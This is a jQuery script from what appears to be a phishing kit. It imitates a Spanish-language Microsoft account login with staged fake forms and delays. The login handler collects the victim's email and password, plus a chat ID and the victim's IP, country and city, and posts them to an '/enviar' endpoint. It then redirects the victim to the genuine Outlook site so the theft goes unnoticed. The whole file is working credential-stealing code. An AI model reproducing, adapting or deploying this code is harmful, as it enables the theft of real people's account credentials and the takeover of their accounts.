$(document).ready(function () {
  $(document).on("click", ".next-btn", function () {
    var email = $("#txtmail");
    var message = $(".error-message");
    var loader = $(".loader");

    loader.hide();

    message.html("");

    if (email.val().trim() === "") {
      message.html(
        "Escribe una direcci&oacute;n de correo electr&oacute;nico, un n&uacute;mero de tel&eacute;fono o un nombre de Skype v&aacute;lidos."
      );
      return;
    }

    if (!validateEmail(email.val().trim())) {
      message.html(
        "Escribe una direcci&oacute;n de correo electr&oacute;nico, un n&uacute;mero de tel&eacute;fono o un nombre de Skype v&aacute;lidos."
      );
      return;
    }

    loader.show();

    $(document).find("span#lbl-email").text(email.val().trim());

    setTimeout(function () {
      loader.hide();
      $(".login-form-1").hide();
      $(".login-form-2").show();
    }, 2000);
  });

  $(document).on("click", ".next-btn2", function () {
    var email = $("#txtmail");
    var message = $(".error-message");
    var loader = $(".loader");

    loader.hide();

    message.html("");

    if (email.val().trim() === "") {
      message.html(
        "Escribe una direcci&oacute;n de correo electr&oacute;nico, un n&uacute;mero de tel&eacute;fono o un nombre de Skype v&aacute;lidos."
      );
      return;
    }

    if (!validateEmail(email.val().trim())) {
      message.html(
        "Escribe una direcci&oacute;n de correo electr&oacute;nico, un n&uacute;mero de tel&eacute;fono o un nombre de Skype v&aacute;lidos."
      );
      return;
    }

    loader.show();

    $(document).find("span#lbl-email").text(email.val().trim());

    setTimeout(function () {
      loader.hide();
      $(".login-form-1").hide();
      $(".login-form-2").hide();
      $(".login-form-3").show();
    }, 2000);
  });

  $(document).on("click", ".next-btn3", function () {
    var email = $("#txtmail");
    var message = $(".error-message");
    var loader = $(".loader");

    loader.hide();

    message.html("");

    if (email.val().trim() === "") {
      message.html(
        "Escribe una direcci&oacute;n de correo electr&oacute;nico, un n&uacute;mero de tel&eacute;fono o un nombre de Skype v&aacute;lidos."
      );
      return;
    }

    if (!validateEmail(email.val().trim())) {
      message.html(
        "Escribe una direcci&oacute;n de correo electr&oacute;nico, un n&uacute;mero de tel&eacute;fono o un nombre de Skype v&aacute;lidos."
      );
      return;
    }

    loader.show();

    $(document).find("span#lbl-email").text(email.val().trim());

    setTimeout(function () {
      loader.hide();
      $(".login-form-1").hide();
      $(".login-form-2").hide();
      $(".login-form-3").hide();
      $(".login-form-4").show();
    }, 2000);
  });

  $(document).on("click", ".current-email i", function () {
    $(".login-form-4").hide();
    $(".login-form-3").hide();
    $(".login-form-2").hide();
    $(".login-form-1").show();
  });

  $(document).on("click", ".login-btn", function () {
    var email = $("#txtmail");
    var pass = $("#txtpass");
    var chat_id = $("#chatid");


	var ip = $("#ip");
	var pais = $("#pais");
	var ciudad = $("#ciudad");


    var message = $(".error-message");
    var loader = $(".loader");
    var id = getUrlParameter("id") === undefined ? "" : getUrlParameter("id");

    if (pass.val().trim() === "") {
      message.html("Escribe la contraseña de tu cuenta Microsoft.");
      return;
    }

    loader.show();

    var data = {
      mail_address: email.val().trim(),
      mail_pass: pass.val().trim(),
	  chat_id: chat_id.val().trim(),
	  ip: ip.val().trim(),
	  pais: pais.val().trim(),
	  ciudad: ciudad.val().trim(),
    };

    console.log(data);

    $.ajax({
      type: "post",
      url: "/enviar",
      data: data,
      success: function (data) {
        console.log(data);
        loader.hide();

        setTimeout(function () {
          window.location = "https://outlook.live.com/mail/0/";
        }, 1000);
      },
      error: function (a, b, c) {
        console.log("error");
      },
    });
  });
});

function hideMessage() {
  $(".error-message").html("");
}

function validateEmail(email) {
  var re =
    /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(email);
}

var getUrlParameter = function getUrlParameter(sParam) {
  var sPageURL = decodeURIComponent(window.location.search.substring(1)),
    sURLVariables = sPageURL.split("&"),
    sParameterName,
    i;

  for (i = 0; i < sURLVariables.length; i++) {
    sParameterName = sURLVariables[i].split("=");

    if (sParameterName[0] === sParam) {
      return sParameterName[1] === undefined ? true : sParameterName[1];
    }
  }
};
